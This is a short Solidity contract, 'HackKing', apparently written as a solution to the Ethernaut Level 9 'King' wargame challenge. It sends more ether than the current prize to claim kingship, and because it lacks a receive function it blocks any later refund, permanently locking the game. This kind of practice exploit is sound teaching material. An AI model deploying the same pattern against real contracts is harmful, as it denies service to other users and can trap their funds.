// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @notice Interface relating to the King contract found in Ethernaut Level 9
 * @notice Full contract can be found in the ethernaut directory of this repo
 */
interface IKing {
    function prize() external view returns (uint256);
}

contract HackKing {
    IKing private immutable _king;

    constructor(address payable kingAddress) {
        _king = IKing(kingAddress);
    }

    function becomeKing() external payable {
        require(msg.value > _king.prize(), "Not enough ETH sent");
        //Send eth to the king contract
        (bool success, ) = payable(address(_king)).call{value: msg.value}("");
        require(success, "Transfer failed.");
    }
}